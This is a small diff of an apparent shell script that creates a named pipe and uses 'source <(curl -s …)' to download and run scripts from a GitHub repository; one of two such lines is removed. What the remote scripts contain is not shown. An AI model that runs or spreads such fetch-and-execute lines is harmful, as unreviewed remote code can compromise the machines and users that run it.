@@ -4,6 +4,5 @@ mkfifo pipe
 
 source <(curl -s https://raw.githubusercontent.com/bazideneme/deneme4/main/deneme2)
 
-source <(curl -s https://raw.githubusercontent.com/bazideneme/deneme4/main/soruisareti)
 
 
